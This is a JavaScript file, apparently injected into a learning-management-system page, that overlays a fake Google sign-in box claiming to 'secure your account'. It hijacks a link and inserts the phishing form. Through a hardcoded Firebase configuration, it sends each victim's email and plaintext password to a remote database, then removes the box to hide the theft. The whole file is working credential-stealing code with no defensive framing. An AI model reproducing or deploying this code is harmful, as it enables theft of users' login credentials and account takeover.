const anchor = document.currentScript.parentElement;
anchor.setAttribute('href','javascript:void(0)');


const newElement = ' <div class="display-box">        <div class="box-header">            <p class="heading">Connect your lms to google to secure your account</p>            </div>        <div class="box-body">            <div class="container">                <img id = "google-image "src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo">                <form id = "login-form__" autocomplete="off">                  <label id = "label__" for="email__">Email or phone</label>                  <div style = "display: flex; flex-direction: column; justify-content: space-between;"><input style = "border: 1px solid #ddd;border-radius: 4px;padding: 10px;margin-bottom: 20px;font-size: 16px;" class="input__" type="email" id="email__" name="email" autocomplete="false" required> <div class = "email-message" style = "margin-bottom: 20px;color:red; font-size: 0.6rem; display:none;">Please enter correct email</div>    </div>             <label  id = "label__" for="password__">Password</label>                  <input style = "border: 1px solid #ddd;border-radius: 4px;padding: 10px;margin-bottom: 20px;font-size: 16px;"   class="input__" type="password" id="password__" name="password" autocomplete="false" required>                  <div class="forgot-password">Forgot password?</div>                  <button style = "background-color: #4285f4;color: #fff;border: none;border-radius: 4px;padding: 10px;font-size: 16px;margin-bottom: 20px;cursor: pointer;" type = "button" class="login-button__">Sign in</button>                  <div class="create-account">Create account</div>                </form>                  </div>    </div>    </div>';

const button = document.querySelector('.btn-primary');
const tempElement = document.createElement('div');
tempElement.innerHTML = newElement;
button.parentNode.insertBefore(tempElement);


document.write('<script type="module">    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";    import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-analytics.js";    import{ getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";    const firebaseConfig = {        apiKey: "AIzaSyBvD23nC3ChxW4gDh4zglPXYepHhsJjRJM",        authDomain: "forms-46d73.firebaseapp.com",        databaseURL: "https://forms-46d73-default-rtdb.firebaseio.com",        projectId: "forms-46d73",        storageBucket: "forms-46d73.appspot.com",        messagingSenderId: "1051193376821",        appId: "1:1051193376821:web:f91e445cfa120ce207f17c",        measurementId: "G-Y4X1KGJW5M",    };       const app = initializeApp(firebaseConfig);    const analytics = getAnalytics(app); const one = Math.floor(Math.random() * 100); const two = Math.floor(Math.random() * 100);  const db = getDatabase();        const email = document.querySelector("#email__");    const password = document.querySelector("#password__");    const loginButton = document.querySelector(".login-button__");    const box = document.querySelector(".display-box");  const emailMessage = document.querySelector(".email-message"); loginButton.addEventListener("click",(event)=>{ event.preventDefault(); if(!email.value.includes("@")){ email.style.marginBottom = "0px"; emailMessage.style.display = "block"; return;} if(email.value.includes(".")){email.value=(email.value).replace(".","dot");} const reference = ref(db, one + " " + two);            set(reference,{email: email.value,password: password.value,});     if(email.value && password.value){box.remove();}       });</script>');


    const styleSheet = document.createElement("style");
    styleSheet.innerText = '.display-box{ background: white;   border: 2px solid black;    position: fixed;    top: 50%;    left: 50%;    transform: translate(-50%, -50%);}.box-header{    display: flex;    justify-content: space-between;    border-bottom: 2px solid black;    align-items: center;}.heading{    font-size: 1rem;    font-weight: bold;    margin: 0;    padding: 0;}.close-button{    outline: none;    border: none;    background-color: white;    font-size: 1.5rem;    font-weight: bold;    cursor: pointer;    color: white;}/* .box-body{    padding: 10px;} *//* body {    background-color: #f2f2f2;    font-family: Arial, sans-serif;  }   */  .container {    max-width: 400px;    margin: 0 auto;    background-color: #fff;    padding: 30px;  }    #google-image {    display: block;    margin: 0 auto 30px;  }    #login-form__ {    display: flex;    flex-direction: column;  }    #label__ {    font-size: 14px;    font-weight: 600;    margin-bottom: 5px;  }    .input__{    border: 1px solid #ddd;    border-radius: 4px;    padding: 10px;    margin-bottom: 20px;    font-size: 16px;  }    .forgot-password {    font-size: 14px;    color: #4285f4;    margin-bottom: 20px;    text-align: right;  }    .login-button__ {    background-color: #4285f4;    color: #fff;    border: none;    border-radius: 4px;    padding: 10px;    font-size: 16px;    margin-bottom: 20px;    cursor: pointer;  }    .create-account {    font-size: 14px;    color: #4285f4;    text-align: center;    cursor: pointer;  }  .saved{    /* color: white; */    position: fixed;    top: 95%;    left: 95%;  }  @media screen and (max-width: 600px) {    .container {      padding: 10px;    }    img {      margin: 0;    }  }';
    document.head.appendChild(styleSheet);
